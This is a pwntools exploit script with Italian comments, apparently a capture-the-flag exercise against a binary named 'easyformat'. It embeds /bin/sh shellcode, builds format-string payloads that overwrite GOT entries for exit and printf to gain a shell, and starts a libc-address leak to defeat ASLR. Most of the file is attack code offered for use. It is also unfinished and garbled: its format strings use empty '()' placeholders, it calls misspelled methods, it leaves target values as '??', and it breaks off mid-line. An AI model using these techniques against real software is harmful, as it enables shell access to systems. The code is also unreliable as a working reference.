from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcodeLenght = 23

#abbiamo 3 possibilità per exploit
#1- cambiare indirizzo funzione exit nella got con quello che ci interessa (QUELLO SCRITTO SOTTO)

p = process("./easyformat")
f = elf.ELF("./easyformat")
libc = elf.ELF("./libc.so") #questo in locale, per il remote devo usare la libc scaricata dal sito

raw_input()

displacement = 4 #devo trovarlo
#format string + padding + shellcode 
#whatToWrite =  ??
#il where lo troviamo nel decompiler nella got.plt table
whereToWrite = f.got['exit'] 

def calculateFormatString(whatToWrite, whereToWrite, displacement):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(firstAddr) + p32(secondAddr) + \
	"%()c%()$hn".format(firstHalf - 8, displacement) + \
	"%()c%()$hn".format(secondHalf - firstHalf, displacement + 1)


formatString = "AAAA %x %x %x %x %x"
padding = "\x90"*(100-len(formatString))
buf = formatString + padding + shellcode

p.sendLine(buf)

p.interactive()

#2- sovrascrivere exit con la funzione vuln stessa, e nella seconda iterazione di vuln sovrascrivo printf con system

p = process("./easyformat")
f = elf.ELF("./easyformat")

raw_input()

displacement = 4 #devo trovarlo
#format string + padding + shellcode 
#whatToWrite =  ??
#il where lo troviamo nel decompiler nella got.plt table
exitGot = f.got['exit']
printfGot = f.got['printf']
vulnSymbol = f.symbol['vuln'] 
#l'indirizzo di system vado su gdb e faccio print system
#systemAddr = ??


def calculateFormatString(whatToWrite, whereToWrite, displacement):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(firstAddr) + p32(secondAddr) + \
	"%()c%()$hn".format(firstHalf - 8, displacement) + \
	"%()c%()$hn".format(secondHalf - firstHalf, displacement + 1)

#in this case i need only format string, no padding o shallcode (ma )

p.sendLine(formatString)

p.interactive()

#dopo che ottengo la shell, scrivo /bin/sh 2 volte e ottengo la shell fatta bene


#sulla piattaforma non funziona perchè è attivo elsr, quindi per fare l'exloit dobbiamo
#possiamo usare il format string per stampare indirizzi sullo stack per trovare l'indirizzo di qualcosa di libc
#lo start main chiama/è chiamato dalla libc
#troviamo che il displacement è di 75 in qualche modo

#dopo interactive metto



s = p.readLine().strip()[-8:].decode("hex")
libcBase = u32(s, endianess="big") . libc 